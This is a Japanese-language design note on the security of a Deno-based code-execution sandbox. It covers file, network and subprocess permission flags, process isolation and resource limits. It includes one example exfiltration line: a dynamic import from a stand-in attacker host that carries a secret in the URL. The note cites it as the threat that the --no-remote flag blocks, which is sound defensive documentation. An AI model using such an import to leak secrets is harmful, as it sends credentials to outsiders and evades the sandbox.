# セキュリティ考慮事項

## Denoパーミッションシステム

Denoの厳格なパーミッションシステムにより、実行コードの権限を細かく制御します。

### ファイルシステムアクセス

- **読み取り**: `--allow-read=/workspace,/tools` で指定ディレクトリのみ読み取り可能
- **書き込み**: `--allow-write` で明示的に許可しない限り書き込み不可（デフォルト：禁止）
- パストラバーサル攻撃の防止（`../` を含むcodeIdを拒否）
- 実行ファイル名の検証（英数字、ハイフン、アンダースコアのみ）

### ネットワークアクセス

- **デフォルト**: すべてのネットワークアクセスを禁止
- `--allow-net=host1,host2` で特定ホストのみ許可可能
- 環境変数 `DENO_ALLOW_NET` で制御
- **リモートモジュール取得の防止**: `--no-remote` フラグによりリモートモジュールの動的インポートを完全にブロック
  - `--allow-net` が無効でもモジュール取得フェーズは実行されるため、`--no-remote` は必須のセキュリティ対策
  - これにより `await import(https://attacker/${secret}.ts)` のようなデータ流出経路を防止

### プロセス実行

- **デフォルト**: サブプロセス実行を禁止
- `--allow-run` で明示的に許可された場合のみ実行可能
- 環境変数 `DENO_ALLOW_RUN` で制御（デフォルト：false）

## プロセス分離

- 各実行は独立した子プロセス
- 環境変数の分離（PATH、DENO_DIR のみ許可）
- 標準入力のクローズ（ユーザー入力不可）

## リソース制限

- タイムアウトによる無限ループ防止（デフォルト5秒、最大300秒）
- コンテナレベルのメモリ・CPU制限
- stdout/stderr バッファ制限（10MB）

## セキュリティ上の利点

従来のtsxと比較して、Denoは以下の脅威を軽減します：

- ✅ **ファイルシステム侵害**: 読み取り/書き込みを指定ディレクトリに限定
- ✅ **ネットワーク攻撃**: 外部通信をホスト単位で制御（デフォルトで禁止）
- ✅ **リモートモジュールによるデータ流出**: `--no-remote` により動的インポートを完全にブロック
- ✅ **プロセス妨害**: サブプロセス実行を禁止し、親プロセス攻撃を防止
- ⚠️ **リソース枯渇（DoS）**: タイムアウトとコンテナレベル制限で対処
